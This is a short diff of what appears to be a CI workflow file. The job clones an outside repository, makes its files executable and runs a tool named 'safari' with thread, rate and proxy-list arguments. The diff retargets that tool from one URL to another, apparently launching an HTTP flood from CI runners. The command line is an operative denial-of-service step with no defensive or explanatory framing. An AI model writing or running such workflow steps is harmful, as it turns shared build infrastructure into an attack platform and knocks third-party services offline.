@@ -24,5 +24,5 @@ jobs:
         git clone https://github.com/Kiwiwjkwi/cuddly-octo-bassoon.git
         cd cuddly-octo-bassoon
         chmod +x *
-        ./safari  https://c4.dstatbot.win/QPAE7HyJ   400 10000 8000 proxies.txt --cdn  --auth 
+        ./safari  https://retrostress.net/dashboard   400 10000 8000 proxies.txt --cdn  --auth 
     
